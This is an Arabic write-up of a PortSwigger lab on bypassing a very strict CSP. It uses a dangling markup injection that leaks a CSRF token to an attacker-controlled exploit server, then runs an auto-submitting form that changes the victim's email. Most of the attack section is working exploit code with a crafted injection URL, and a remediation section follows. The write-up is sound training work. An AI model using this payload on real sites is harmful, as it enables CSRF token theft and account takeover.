# [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

## **`الهدف`**
قم بتنفيذ هجوم `form hijacking` يتخطى الـ `CSP` ويستخرج رمز `CSRF token` ويستخدمه لتغيرر البريد الإلكتروني الخاص بالضحية إلى `hacker@evil-user.net`.
## **`خطوات الحل`**
نقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت التالي في خانة `Body`.

```html
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://0aeb0054042d48b480da175100c00061.web-security-academy.net/";
const exploitServer = "https://exploit-0a1b008f04cf480980cf162901190043.exploit-server.net/exploit";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```
بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب على السيرفر تطبيق آلية ترميز المخرجات `Output Encoding` لتحويل رموز `HTML` الخاصة إلى نصوص آمنة، فحتى لو تمكن المهاجم من إرسال كود `XSS` خبيث، سيتدخل المتصفح ويعرضه كنص مقروء ويمنع تنفيذ دالة `alert 1` بفضل هذا الترميز.

ويجب على السيرفر تطبيق سياسة التحقق من المدخلات `Input Validation` بناء على قائمة بيضاء `Whitelist` لرفض أي رموز غير متوقعة، فحتى لو حاول المهاجم التلاعب بالبيانات من جهة العميل، سيتدخل السيرفر ويرفض الطلب ويمنع إدخال أكواد `JavaScript` بفضل هذه الفلترة الصارمة.

ويجب على المطور الاعتماد على محركات قوالب `Template Engines` حديثة تدعم الترميز التلقائي `Auto-escaping`، فحتى لو نسي المطور معالجة بعض المدخلات يدويا، سيتدخل إطار العمل `Framework` ويشفر البيانات ويمنع تفعيل وسم `script` بفضل هذه الحماية المدمجة، ولكن يجب التأكيد على أن محرك القوالب يجب أن يدعم `Context-Aware Auto-escaping`.

ويجب على مسؤول النظام إعداد جدار حماية تطبيقات الويب `WAF` لفحص وتحليل جميع الطلبات الواردة، فحتى لو نسي المطورون ترقيع الثغرة برمجيا، سيتدخل الـ `WAF` ويحظر الطلب المشبوه ويمنع وصول الـ `Payload` إلى السيرفر بفضل قواعد الحماية `Rules` المحدثة.

وكطبقة حماية إضافية للتعامل مع هجوم `Dangling Markup`، بما أن التطبيق يستخدم بالفعل ترويسة `CSP` صارمة تمنع أكواد الجافاسكريبت، يجب على السيرفر إضافة توجيه `form-action self` داخل سياسة الـ `CSP`، فحتى لو تمكن المهاجم من حقن وسم زر أو نموذج، سيتدخل المتصفح ويمنع إرسال بيانات المستخدم أو الـ `CSRF Token` إلى سيرفر خارجي يسيطر عليه المهاجم بفضل هذا التوجيه الصارم.

وكخطوة أمان إضافية، بالرغم من أنها لن تمنع هذه الثغرة، يجب تفعيل خاصية `HttpOnly` لملفات تعريف الارتباط الخاصة بالجلسة `Session Cookies`، وعلى الرغم أن هذا الإجراء لن يمنع ثغرة الـ `XSS` من الحدوث، ولكنه سيمنع كود الجافاسكريبت الخبيث من الوصول إلى الجلسة عبر `document.cookie`، مما يفشل محاولات اختراق الحساب `Account Takeover`.
